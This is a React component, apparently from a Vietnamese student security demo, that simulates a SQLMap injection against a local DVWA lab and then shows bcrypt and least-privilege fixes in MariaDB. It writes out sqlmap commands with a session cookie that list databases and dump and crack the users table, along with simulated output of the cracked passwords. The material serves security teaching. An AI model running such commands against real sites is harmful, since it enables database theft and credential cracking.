"use client";

import { useState } from "react";
import { Database, KeyRound, Play, RotateCcw, ShieldCheck } from "lucide-react";

interface Props {
  containerRef: string;
  phpsessid: string;
  activeTab?: string;
}

interface UserRow {
  user_id: number;
  user: string;
  md5: string;
  plain: string;
}

const INITIAL_USERS: UserRow[] = [
  {
    user_id: 1,
    user: "admin",
    md5: "5f4dcc3b5aa765d61d8327deb882cf99",
    plain: "password",
  },
  {
    user_id: 2,
    user: "gordonb",
    md5: "e99a18c428cb38d5f260853678922e03",
    plain: "abc123",
  },
  {
    user_id: 3,
    user: "1337",
    md5: "8d3533d75ae2c3966d7e0d4fcc69216b",
    plain: "charley",
  },
  {
    user_id: 4,
    user: "pablo",
    md5: "0d107d09f5bbe40cade3de5c71e9e9b7",
    plain: "letmein",
  },
  {
    user_id: 5,
    user: "smithy",
    md5: "5f4dcc3b5aa765d61d8327deb882cf99",
    plain: "password",
  },
];

export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) {
  const [tab, setTab] = useState<"sqlmap" | "mariadb">(
    activeTab === "m3-mariadb-patch" ? "mariadb" : "sqlmap"
  );
  const [sqlmapStage, setSqlmapStage] = useState<1 | 2 | 3>(1);
  const [isScanning, setIsScanning] = useState(false);
  const [bcryptApplied, setBcryptApplied] = useState(false);
  const [leastPrivApplied, setLeastPrivApplied] = useState(false);

  const container = containerRef.trim() || "dvwa";
  const session = phpsessid.trim() || "7nst0hrqrfmv744a5ouj7663b0";

  const handleStageSelect = (stage: 1 | 2 | 3) => {
    setSqlmapStage(stage);
    setIsScanning(true);
    setTimeout(() => {
      setIsScanning(false);
    }, 400);
  };

  return (
    <div className="rounded-lg border border-hairline bg-surface p-4 sm:p-5">
      <div className="mb-4 flex flex-wrap items-center justify-between gap-3 border-b border-hairline pb-3">
        <div>
          <h3 className="flex items-center gap-2 text-sm font-bold text-ink sm:text-base">
            <Database className="h-4 w-4 text-accent" aria-hidden="true" />
            Interactive Console — Quyết (Laptop Ubuntu VM 2 · SQLMap &amp; MariaDB Live Patching)
          </h3>
          <p className="text-xs text-muted">
            Tự động hóa trích xuất dữ liệu CSDL với SQLMap và thực thi bản vá Bcrypt + Least Privilege.
          </p>
        </div>

        <div className="inline-flex rounded-md border border-hairline bg-subtle p-0.5 text-xs">
          <button
            type="button"
            onClick={() => setTab("sqlmap")}
            className={`cursor-pointer rounded px-3 py-1 font-medium transition-colors ${
              tab === "sqlmap"
                ? "bg-surface text-ink font-semibold shadow-sm"
                : "text-muted hover:text-ink"
            }`}
          >
            1. SQLMap 3 Lệnh
          </button>
          <button
            type="button"
            onClick={() => setTab("mariadb")}
            className={`cursor-pointer rounded px-3 py-1 font-medium transition-colors ${
              tab === "mariadb"
                ? "bg-surface text-ink font-semibold shadow-sm"
                : "text-muted hover:text-ink"
            }`}
          >
            2. MariaDB PoC 3 &amp; Vá lỗi
          </button>
        </div>
      </div>

      {tab === "sqlmap" ? (
        <div className="space-y-4">
          <div className="flex flex-wrap items-center gap-2">
            {[
              { id: 1 as const, label: "Lệnh 1: Liệt kê CSDL (--dbs)" },
              { id: 2 as const, label: "Lệnh 2: Liệt kê bảng (-D dvwa --tables)" },
              { id: 3 as const, label: "Lệnh 3: Trích xuất & Crack MD5 (-T users --dump)" },
            ].map((s) => (
              <button
                key={s.id}
                type="button"
                onClick={() => handleStageSelect(s.id)}
                className={`inline-flex cursor-pointer items-center gap-1.5 rounded-md border px-3 py-1.5 font-mono text-xs transition-colors ${
                  sqlmapStage === s.id
                    ? "border-ink bg-ink text-canvas font-semibold"
                    : "border-hairline bg-subtle text-secondary hover:text-ink"
                }`}
              >
                <Play className="h-3 w-3" aria-hidden="true" />
                {s.label}
              </button>
            ))}
          </div>

          <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-4 font-mono text-xs leading-relaxed text-zinc-200">
            <div className="mb-2 text-zinc-400 border-b border-zinc-800 pb-2 flex items-center justify-between">
              <div>
                <span className="text-zinc-500">quyet@ubuntu-vm:~$</span>{" "}
                <span className="text-emerald-300 font-semibold">
                  sqlmap -u &quot;http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID={session.slice(0, 8)}...&quot;{" "}
                  {sqlmapStage === 1 && "--dbs --batch"}
                  {sqlmapStage === 2 && "-D dvwa --tables --batch"}
                  {sqlmapStage === 3 && "-D dvwa -T users --dump --batch"}
                </span>
              </div>
              <span className="text-[10px] text-zinc-500">sqlmap/1.8.4</span>
            </div>

            {isScanning ? (
              <div className="py-8 text-center text-amber-400">
                <span className="inline-block animate-spin mr-2">⚡</span>
                Đang gửi payload kiểm thử và bóc tách cấu trúc CSDL...
              </div>
            ) : (
              <>
                {sqlmapStage === 1 && (
                  <pre className="overflow-x-auto text-zinc-200 leading-relaxed">
{`[INFO] testing connection to the target URL
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (DBMS: 'MySQL')
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] the back-end DBMS is MySQL (MariaDB fork)
available databases [2]:
[*] dvwa
[*] information_schema

[✓] Hoàn thành Lệnh 1: Phát hiện 2 CSDL đích.`}
                  </pre>
                )}

                {sqlmapStage === 2 && (
                  <pre className="overflow-x-auto text-zinc-200 leading-relaxed">
{`[INFO] fetching tables for database: 'dvwa'
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+

[✓] Hoàn thành Lệnh 2: Phát hiện bảng nhạy cảm 'users'.`}
                  </pre>
                )}

                {sqlmapStage === 3 && (
                  <pre className="overflow-x-auto text-amber-200 leading-relaxed">
{`[INFO] fetching entries for table 'users' in database 'dvwa'
[INFO] recognizing possible password hashes in column 'password'
[INFO] dictionary-based attack against column 'password' with wordlist.txt
[100%] [████████████████████████████████] 5/5 hashes cracked

Database: dvwa
Table: users
[5 entries]
+---------+---------+--------------------------------------------+
| user_id | user    | password (cleartext)                       |
+---------+---------+--------------------------------------------+
| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| 2       | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------+--------------------------------------------+
[✓] Hoàn thành Lệnh 3: Toàn bộ mật khẩu MD5 không salt đã bị bẻ khóa 100%!`}
                  </pre>
                )}
              </>
            )}
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="flex flex-wrap items-center gap-2">
            <button
              type="button"
              onClick={() => setBcryptApplied(true)}
              className="inline-flex cursor-pointer items-center gap-1.5 rounded-md bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-emerald-700"
            >
              <KeyRound className="h-3.5 w-3.5" aria-hidden="true" />
              Thực thi Vá lỗi 1: Băm Bcrypt (cost=12)
            </button>
            <button
              type="button"
              onClick={() => setLeastPrivApplied(true)}
              className="inline-flex cursor-pointer items-center gap-1.5 rounded-md bg-accent px-3 py-1.5 text-xs font-semibold text-white hover:opacity-90"
            >
              <ShieldCheck className="h-3.5 w-3.5" aria-hidden="true" />
              Thực thi Vá lỗi 2: Tạo User dvwa_svc (Least Privilege)
            </button>
            {(bcryptApplied || leastPrivApplied) && (
              <button
                type="button"
                onClick={() => {
                  setBcryptApplied(false);
                  setLeastPrivApplied(false);
                }}
                className="inline-flex cursor-pointer items-center gap-1 rounded-md border border-hairline bg-subtle px-3 py-1.5 text-xs text-secondary hover:text-ink"
              >
                <RotateCcw className="h-3 w-3" aria-hidden="true" /> Reset về mặc định
              </button>
            )}
          </div>

          {/* Interactive MariaDB Table View */}
          <div className="overflow-x-auto rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5">
            <div className="mb-2 font-mono text-xs text-zinc-400">
              root@{container}:/# mysql -u root -e &quot;USE dvwa; SELECT user_id, user, password FROM users;&quot;
            </div>
            <table className="w-full text-left font-mono text-xs">
              <thead>
                <tr className="border-b border-zinc-800 text-zinc-400">
                  <th className="px-2 py-1.5">user_id</th>
                  <th className="px-2 py-1.5">user</th>
                  <th className="px-2 py-1.5">password ({bcryptApplied ? "Bcrypt Salted (cost=12)" : "MD5 Unsalted"})</th>
                  <th className="px-2 py-1.5">Trạng thái bảo mật</th>
                </tr>
              </thead>
              <tbody>
                {INITIAL_USERS.map((u) => {
                  const isDupMd5 = u.user_id === 1 || u.user_id === 5;
                  const displayHash =
                    bcryptApplied && u.user_id === 1
                      ? "$2y$12$K9p8Q3vT2xL7wR4mN6zA1eH8cB5vD0fG2jK4lM6nP8qR0sT2uV4wX"
                      : bcryptApplied && u.user_id === 5
                      ? "$2y$12$zQ7mL1vN8pR3tX5wK2cF9uB6dG4hJ0kM2nP8qS5tV1yZ7aC3eI9oU"
                      : u.md5;

                  return (
                    <tr
                      key={u.user_id}
                      className={`border-b border-zinc-800/60 ${
                        !bcryptApplied && isDupMd5 ? "bg-rose-950/25" : ""
                      }`}
                    >
                      <td className="px-2 py-1.5 text-zinc-300">{u.user_id}</td>
                      <td className="px-2 py-1.5 font-semibold text-zinc-100">{u.user}</td>
                      <td
                        className={`px-2 py-1.5 break-all ${
                          bcryptApplied
                            ? "text-emerald-300"
                            : isDupMd5
                            ? "text-rose-300"
                            : "text-amber-200"
                        }`}
                      >
                        {displayHash}
                      </td>
                      <td className="px-2 py-1.5 font-sans text-[11px]">
                        {bcryptApplied ? (
                          <span className="rounded bg-emerald-500/20 px-1.5 py-0.5 text-emerald-300 font-semibold">
                            Salt ngẫu nhiên 128-bit · Chống Rainbow Table
                          </span>
                        ) : isDupMd5 ? (
                          <span className="rounded bg-rose-500/20 px-1.5 py-0.5 text-rose-300 font-bold">
                            Trùng hash MD5 (&quot;{u.plain}&quot;) · Lỗi CWE-759
                          </span>
                        ) : (
                          <span className="text-zinc-400">MD5 32-hex không Salt</span>
                        )}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>

          {leastPrivApplied && (
            <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5 font-mono text-xs text-emerald-300">
              <div className="mb-1 font-sans text-xs font-bold text-zinc-200">
                SHOW GRANTS FOR &apos;dvwa_svc&apos;@&apos;%&apos;:
              </div>
              <pre className="overflow-x-auto">
{`+--------------------------------------------------------------------------------+
| Grants for dvwa_svc@%                                                          |
+--------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'dvwa_svc'@'%' IDENTIFIED BY PASSWORD ...                |
| GRANT SELECT, INSERT, UPDATE ON \`dvwa\`.* TO 'dvwa_svc'@'%'                     |
+--------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
# KẾT QUẢ: Đã tước quyền DROP TABLE, ALTER TABLE, FILE và GRANT của ứng dụng web.`}
              </pre>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
